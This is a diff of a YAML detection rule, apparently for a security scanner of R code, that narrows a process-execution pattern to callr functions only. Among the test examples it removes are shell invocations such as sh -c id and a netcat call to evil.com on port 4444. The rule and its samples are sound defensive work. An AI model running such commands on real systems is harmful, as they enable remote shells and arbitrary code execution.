@@ -1,12 +1,11 @@
-name: system_other_pattern
+name: system_callr
 version: "0.3.0"
 type: R
 attck:
   - T1059
-  - T1195.002
 message: >-
-  These callr, processx, and sys functions run an external process, which may be
-  used to execute arbitrary shell commands or a second R session outside the
+  These callr functions start a separate R session or run an R CMD command,
+  which may be used to execute arbitrary R code or shell commands outside the
   visible R source.
 xpath: >-
   //SYMBOL_FUNCTION_CALL[
@@ -14,10 +13,6 @@ xpath: >-
       text() = 'r_bg' or text() = 'r_safe' or text() = 'r_copycat'
       or text() = 'r_vanilla' or text() = 'rscript'
       or text() = 'rcmd_bg' or text() = 'rcmd_safe' or text() = 'rcmd_copycat'
-      or text() = 'exec_wait' or text() = 'exec_background'
-      or text() = 'exec_internal' or text() = 'eval_safe'
-      or text() = 'eval_fork' or text() = 'r_background'
-      or text() = 'r_internal' or text() = 'r_wait'
     )
     and not(preceding-sibling::OP-DOLLAR)
     and not(preceding-sibling::OP-AT)
@@ -25,11 +20,10 @@ xpath: >-
   |
   //SYMBOL_FUNCTION_CALL[
     (
-      text() = 'r' or text() = 'rcmd' or text() = 'run'
-      or text() = 'pipeline'
+      text() = 'r' or text() = 'rcmd'
     )
     and preceding-sibling::SYMBOL_PACKAGE[
-      text() = 'callr' or text() = 'processx'
+      text() = 'callr'
     ]
   ]
   |
@@ -37,7 +31,7 @@ xpath: >-
     OP-DOLLAR
     and SYMBOL_FUNCTION_CALL[text() = 'new']
     and .//SYMBOL[
-      text() = 'process' or text() = 'r_session' or text() = 'r_process'
+      text() = 'r_session' or text() = 'r_process'
       or text() = 'rcmd_process' or text() = 'rscript_process'
     ]
   ]
@@ -65,30 +59,6 @@ positive_examples:
   - |
     callr::rscript("evil.R")
   - |
-    processx::run("sh", c("-c", "id"))
-  - |
-    processx::pipeline(p1, p2)
-  - |
-    sys::exec_wait("sh", c("-c", "id"))
-  - |
-    sys::exec_internal("id")
-  - |
-    exec_background("nc", c("evil.com", "4444"))
-  - |
-    sys::eval_safe(quote(system("id")))
-  - |
-    sys::eval_fork(quote(system("id")))
-  - |
-    sys::r_background(c("-e", "system('id')"))
-  - |
-    sys::r_internal(c("-e", "system('id')"))
-  - |
-    sys::r_wait(c("-e", "system('id')"))
-  - |
-    processx::process$new("sh", c("-c", "id"))
-  - |
-    p <- process$new("sh", c("-c", "id"))
-  - |
     callr::r_session$new()
   - |
     rp <- r_process$new(opts)
@@ -96,26 +66,12 @@ positive_examples:
     callr::rcmd_process$new(opts)
 negative_examples:
   - |
-    run(model, data)
-  - |
     r(3)
   - |
     rcmd(args)
-  - |
-    process(x)
-  - |
-    exec(plan)
-  - |
-    pipeline(steps)
-  - |
-    out <- data |> run()
-  - |
-    foo$run("x")
-  - |
-    foo@run("x")
   - |
     foo$r(1)
   - |
     foo$new("x")
   - |
-    foo@exec_wait("x")
+    foo@r_safe("x")
